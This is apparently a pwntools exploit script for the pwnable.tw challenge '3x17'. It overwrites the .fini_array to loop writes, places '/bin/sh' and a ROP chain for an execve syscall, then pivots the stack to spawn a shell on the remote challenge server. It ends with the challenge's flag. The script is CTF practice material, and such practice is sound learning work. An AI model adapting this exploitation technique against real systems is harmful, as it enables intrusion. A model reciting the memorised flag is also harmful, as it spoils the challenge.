from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')

# io = process("./3x17")

io = remote("chall.pwnable.tw" ,10105)

fini_array  = 4931824

main = 0x401b6d

libc_csu_fini = 0x402960

leave_ret = 0x401C4B

ret = 0x401C4C

sh = 0x4A16AC
binsh = fini_array + 0x100

syscall = 0x446F05

# 0x000000000041e4af : pop rax ; ret
# 0x000000000044a309 : pop rdx ; pop rsi ; ret
# 0x0000000000401696 : pop rdi ; ret
pop_rax_ret = 0x000000000041e4af
pop_rsi_ret = 0x000000000044a309
pop_rdi_ret = 0x0000000000401696

rop = []

rop.append(flat(pop_rax_ret, 59, pop_rdi_ret) )
rop.append(flat(binsh, pop_rsi_ret, 0) )
rop.append(flat(0, syscall) )

io.sendlineafter("addr:", "+" + str(fini_array))
io.sendafter("data:", p64(libc_csu_fini) + p64(main))

io.sendlineafter("addr:", "+" + str(binsh))
io.sendafter("data:", "/bin/sh")

for i in range(0,3):
    io.sendlineafter("addr:", "+" + str(fini_array+0x10+i*0x18))
    io.sendafter("data:", rop[i])

io.sendlineafter("addr:", "+" + str(fini_array))
io.sendafter("data:", p64(leave_ret) + p64(main))


io.interactive()

# FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}